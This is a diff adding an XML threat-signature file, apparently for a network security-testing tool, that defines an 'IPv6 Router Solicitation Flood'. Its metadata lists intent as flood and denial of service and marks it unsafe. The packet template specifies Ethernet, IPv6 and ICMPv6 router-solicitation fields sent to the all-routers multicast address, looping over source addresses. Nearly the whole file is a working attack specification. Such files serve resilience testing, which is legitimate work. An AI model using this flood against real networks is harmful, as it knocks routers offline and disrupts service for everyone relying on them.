@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IPv6 Router Solicitation Flood"/>
+    <EngDesc display="true" value="This threat sends out a flood of ICMPv6 router solicitation requests. This can flood a router that tries to keep up by replying with router advertisement packets."/>
+    <Intent display="true">
+      <item value="Flood"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="ICMP6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID value="00000107070fdace00c000a80001003c29985cae" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="partial"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139462151" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIPv6" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="33:33:00:00:00:02" pktType="86DD">
+      <IPv6 Version="6" Priority="00" Flow-Label="00000" Payload-Length="0008" Next-Header="3A" Hop-Limit="FF" Source-Address="$sourceIPv6" Destination-Address="ff02:0000:0000:0000:0000:0000:0000:0002">
+        <ICMPv6Header Type="85" Code="00" Checksum="@checksum(IPv6.Source-Address,IPv6.Destination-Address,IPv6.Payload-Length,00,IPv6.Next-Header,ICMPv6Header.Type,ICMPv6Header.Code,CRC16)" v6payload="00000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
